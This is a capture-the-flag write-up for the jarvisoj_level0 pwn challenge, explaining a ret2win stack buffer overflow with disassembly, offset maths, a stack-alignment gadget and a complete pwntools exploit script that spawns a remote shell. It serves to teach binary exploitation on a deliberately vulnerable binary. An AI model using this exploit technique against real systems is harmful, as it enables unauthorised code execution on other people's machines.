# jarvisoj_level0

**BUUCTF · PWN · Easy** — a textbook `ret2win`: a classic stack buffer overflow via `read()`, overwriting the return address to jump into an orphan function that calls `system("/bin/sh")`, with a stack-alignment fix along the way.

---

## TL;DR

`vulnerable_function` reads up to 512 bytes into a 128-byte stack buffer with no bounds
checking. The binary conveniently ships a dead function, `callsystem()`, that nobody calls
but that drops straight into `system("/bin/sh")`. The entire exploit is: overflow the
buffer, overwrite the return address with the address of `callsystem`, land a single-`ret`
gadget first to fix stack alignment, done.

```
Arch:       amd64-64-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

NX being enabled would normally rule out shellcode injection, but it's irrelevant here —
the exploit never injects code, it only redirects execution to code that already exists in
the binary.

---

## 1. Reconstructed C Source

Based on the disassembly, the original program is reasonably close to this:

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

// never called from main() or anywhere else — a dead function left in the binary
void callsystem(void) {
    system("/bin/sh");
}

void vulnerable_function(void) {
    char buf[128];          // 0x80 bytes, at rbp-0x80
    read(0, buf, 0x200);    // reads up to 512 bytes — more than buf can hold
}

int main(int argc, char **argv) {
    write(1, "Hello, World\n", 13);
    vulnerable_function();
    return 0;
}
```

The key design flaw: `read()` is told to accept up to `0x200` (512) bytes, but the
destination buffer is only `0x80` (128) bytes. Nothing checks the two against each other.

---

## 2. Disassembly Walkthrough

### 2.1 `vulnerable_function` — where the bug lives

```asm
4005a6: push rbp
4005a7: mov  rbp, rsp
4005aa: add  rsp, -0x80        ; 128 bytes of stack space for buf

4005ae: lea  rax, [rbp-0x80]   ; rax = &buf (buffer starts at rbp-0x80)
4005b2: mov  edx, 0x200        ; 3rd arg: count = 512
4005b7: mov  rsi, rax          ; 2nd arg: buf = &buf
4005ba: mov  edi, 0x0          ; 1st arg: fd = 0 (stdin)
4005bf: call read@plt          ; read(0, buf, 0x200)  <-- the vulnerability
4005c4: leave
4005c5: ret
```

This is a slightly different flavor of overflow from a `gets()`-based one: `read()` doesn't
stop at a newline, it reads exactly up to `count` bytes (or until the stream runs dry). The
overflow is just as real, and the 512-byte ceiling gives plenty of room for a return address
overwrite plus any padding needed — no byte-budget pressure here.

### 2.2 `callsystem` — the hijack target

```asm
400596: push rbp
400597: mov  rbp, rsp
40059a: mov  edi, 0x400684     ; "/bin/sh"
40059f: call system@plt
4005a4: pop  rbp
4005a5: ret
```

A complete, ready-to-use function that nobody in `main()` ever calls. Confirmed from
`.rodata`:

```
400680 01000200 2f62696e 2f736800 48656c6c
                 ^^^^^^^^^^^^^^^^^^
                 0x400684: "/bin/sh\0"
```

### 2.3 `main`

```asm
4005c6: push rbp
4005c7: mov  rbp, rsp
...
4005d5: mov  edx, 0xd          ; 13 bytes
4005da: mov  esi, 0x40068c     ; "Hello, World\n"
4005df: mov  edi, 0x1
4005e4: call write@plt         ; write(1, "Hello, World\n", 13)
4005e9: mov  eax, 0x0
4005ee: call 4005a6 <vulnerable_function>
```

`main()` just prints a banner and calls the vulnerable function — no prompt, no input
validation, nothing standing between stdin and the overflow.

---

## 3. Finding the Offset

```asm
4005ae: lea rax, [rbp-0x80]    ; buffer starts 0x80 bytes below rbp
```

```
distance from buf to saved rbp = 0x80 = 128 bytes
+ saved rbp itself              = 8 bytes
──────────────────────────────────────────
= 136 bytes of padding before the return address
```

Stack layout at the point of overflow:

```
higher addresses
┌───────────────────────────┐
│  Return Address (8B)      │  ← overwrite target
├───────────────────────────┤
│  Saved RBP (8B)            │
├───────────────────────────┤
│  buf[128] @ rbp-0x80       │  ← read() writes here, unchecked
└───────────────────────────┘
lower addresses
```

---

## 4. The Stack-Alignment Problem (Again)

Same root cause as in an earlier challenge in this series: the return address is reached via
a `ret` that pops an attacker-controlled value, not via a real `call`. This can leave `rsp`
off the 16-byte boundary that the System V ABI guarantees at the point of any `call` —
and `system()` internally uses SSE instructions (`movaps` and friends) that fault if that
boundary isn't respected.

A bare, single-instruction `ret` gadget found in the binary fixes this by consuming exactly
8 bytes off the stack before the real jump, correcting the parity with no other side
effects:

```
0x0000000000400431 : ret
```

```python
payload = padding + p64(ret_gadget) + p64(callsystem_addr)
```

Confirmed empirically in GDB by breaking right before the `call system@plt` instruction
inside `callsystem` and checking `rsp`:

```
pwndbg> break *0x40059f
pwndbg> run < payload.bin
...
RSP  <multiple of 0x10>
```

Without the gadget, the same breakpoint shows a misaligned `rsp` and a crash deeper inside
`system()` once execution continues.

---

## 5. Final Exploit

```python
from pwn import *

context.arch = 'amd64'

p = remote('<host>', <port>)   # or process('./jarvis') for local testing

PADDING     = 136               # distance from buf to the return address
RET_GADGET  = 0x400431          # bare `ret` — fixes stack alignment before the real call
CALLSYSTEM  = 0x400596          # callsystem() -> system("/bin/sh")

payload = b'A' * PADDING + p64(RET_GADGET) + p64(CALLSYSTEM)

p.send(payload)       # read() reads a fixed byte count, not line-delimited —
                       # no newline needed, and no prompt to wait for beforehand
p.interactive()
```

Running this against both a local copy and the remote service drops into a fully
interactive `/bin/sh` shell — unlike the two previous challenges in this series, this one
doesn't just `cat` a file for you; you land an actual shell and can run arbitrary commands
(`ls`, `cat flag`, `whoami`, etc.) yourself.

### Why `p.send()` instead of `p.sendline()` or `p.sendlineafter()`

`read(0, buf, 0x200)` reads up to a fixed byte count directly from the file descriptor —
it has no concept of "wait for a prompt" or "stop at a newline" the way `gets()` or
`fgets()` might encourage. There's also no prompt string printed before the read (just a
fixed `"Hello, World\n"` banner from `main()`), so there's nothing meaningful to
`recvuntil()` before sending the payload.

---

## 6. Comparing This to the Previous Challenge in the Series

Worth noting explicitly, since the two can look similar at a glance but differ in exploit
construction:

| | Previous challenge (`ciscn_2019_n_1`) | This challenge (`jarvisoj_level0`) |
|---|---|---|
| Overflow source | `gets()` (unbounded) | `read()` (bounded, but larger than the buffer) |
| Target overwritten | adjacent local `float` variable | return address |
| Reaches target function via | a normal `call` from inside the vulnerable function | a `ret` into an attacker-controlled address |
| Stack alignment fix needed | No | Yes |
| Win condition | flipping an `if` comparison | full control-flow hijack |
| Result | runs a hardcoded `cat /flag` | spawns an actual interactive `/bin/sh` |

Both rely on the same root cause family (an unchecked/insufficiently checked write into a
fixed stack buffer), but the *shape* of the fix — alignment gadget or not, data corruption
vs. control-flow hijack — depends entirely on *how* the overwritten value is ultimately
used, which is why reading the surrounding disassembly carefully each time matters more
than pattern-matching to a previous solve.

---

## Key Takeaways

- Always scan the **full** disassembly (`objdump -d` with no filters, or `nm -C`) for
  orphan/dead functions before assuming a ret2libc chain is required — a hand-planted
  `system()` caller, like `callsystem()` here, trivializes an otherwise multi-stage exploit.
- `read(fd, buf, n)` with `n` larger than `buf`'s actual size is just as exploitable as an
  unbounded `gets()` — the fixed byte ceiling only changes how much room the payload has to
  work with, not whether the overflow exists.
- The stack-alignment fix (a bare `ret` gadget before the real target) is required any time
  a return address is overwritten and reached via `ret` rather than a genuine `call` —
  confirmed empirically here the same way as in the earlier ret2win challenge in this
  series, by breakpointing directly before the SSE-sensitive `call` and inspecting `rsp`.
- Match the send method to how the input is actually consumed: a `read()`-based prompt with
  no delimiter doesn't need `sendline()`'s trailing newline or a `recvuntil()` wait, while a
  `gets()`-style prompt usually does.

---

